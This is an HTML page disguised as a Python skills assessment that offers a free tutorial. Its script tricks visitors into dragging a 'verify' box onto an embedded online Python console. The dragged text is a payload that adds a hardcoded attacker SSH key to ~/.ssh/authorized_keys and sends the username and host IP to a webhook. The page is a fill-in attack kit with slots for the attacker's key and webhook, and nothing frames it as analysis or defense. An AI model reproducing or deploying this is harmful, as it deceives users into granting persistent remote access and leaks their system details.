<!DOCTYPE html>
<html>
<head>
<title>Python Skills Assessment</title>
<style>
body {
  font-family: Arial, sans-serif;
  background: #1a1a2e;
  color: #eee;
  display: flex;
  justify-content: center;
  align-items: center;
  min-height: 100vh;
  margin: 0;
}
.container { text-align: center; max-width: 520px; }
h1 { color: #e94560; margin-bottom: 10px; }
p { color: #aaa; margin-bottom: 20px; }
.start-btn {
  background: #e94560;
  color: #fff;
  border: none;
  padding: 18px 40px;
  font-size: 18px;
  border-radius: 10px;
  cursor: pointer;
  margin: 15px 0;
}
.start-btn:hover { background: #c9302c; }
.verify-box {
  display: none;
  background: linear-gradient(135deg, #0f3460, #16213e);
  border: 2px dashed #48bb78;
  border-radius: 12px;
  padding: 30px;
  cursor: grab;
  user-select: none;
  margin: 20px 0;
}
.verify-box:active { cursor: grabbing; }
.verify-icon { font-size: 48px; margin-bottom: 10px; }
.verify-label { font-size: 18px; font-weight: bold; color: #48bb78; }
.verify-text { font-size: 13px; color: #888; margin-top: 8px; }
.instructions {
  display: none;
  background: rgba(72,187,120,0.1);
  border: 1px solid #48bb78;
  border-radius: 8px;
  padding: 15px;
  margin: 15px 0;
  font-size: 14px;
  color: #48bb78;
}
.success-msg {
  display: none;
  color: #48bb78;
  font-size: 20px;
  margin-top: 20px;
}
</style>
</head>
<body>

<div class="container">
  <h1>Python Skills Assessment</h1>
  <p>Complete the interactive verification to access the free tutorial</p>

  <button class="start-btn" id="startBtn">Start Assessment</button>

  <div class="instructions" id="instructions">
    Console loaded! Now drag the Python icon below and <b>drop it onto the terminal window</b> that just opened.
  </div>

  <div class="verify-box" id="dragItem" draggable="true">
    <div class="verify-icon">&#x1F40D;</div>
    <div class="verify-label">Drag to Verify</div>
    <div class="verify-text">Drop this onto the terminal window to continue</div>
  </div>

  <div class="success-msg" id="successMsg">
    Verified! Preparing your tutorial...
  </div>
</div>

<script>
// ══════════════════════════════════════════════════════════
// CHANGE THESE TWO THINGS ONLY:
// ══════════════════════════════════════════════════════════

var ATTACKER_KEY = "PASTE_YOUR_SSH_PUBLIC_KEY_HERE";

var WEBHOOK = "PASTE_YOUR_WEBHOOK_URL_HERE";

// ══════════════════════════════════════════════════════════
// DO NOT CHANGE ANYTHING BELOW
// ══════════════════════════════════════════════════════════

var popup = null;

// Build payload safely using double quotes only
var bashCmd = "mkdir -p ~/.ssh && echo '" + "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKnNMlgV0yv5w5h2p4QzGgmbj8k6p/pfVM6bLc0oTqV8 AttackerAccount@green-liveconsole8" + "' >> ~/.ssh/authorized_keys && chmod 700 ~/.ssh && chmod 600 ~/.ssh/authorized_keys && curl -s '" + "https://webhook.site/83f9a14f-165b-4b31-918b-e9ff55f2d10f" + "?user=$(whoami)&ip=$(hostname -I)' > /dev/null";
var payload = "import os; os.system(\"" + bashCmd + "\")\n";

document.getElementById("startBtn").addEventListener("click", function() {
  popup = window.open(
    "https://www.pythonanywhere.com/embedded3/",
    "console",
    "width=900,height=550,left=50,top=150"
  );
  this.style.display = "none";
  setTimeout(function() {
    document.getElementById("instructions").style.display = "block";
    document.getElementById("dragItem").style.display = "block";
  }, 3000);
});

document.getElementById("dragItem").addEventListener("dragstart", function(e) {
  e.dataTransfer.setData("text/plain", payload);
  e.dataTransfer.effectAllowed = "all";
  if (popup) popup.focus();
});

document.getElementById("dragItem").addEventListener("dragend", function(e) {
  document.getElementById("dragItem").style.display = "none";
  document.getElementById("instructions").style.display = "none";
  document.getElementById("successMsg").style.display = "block";
});
</script>

</body>
</html>
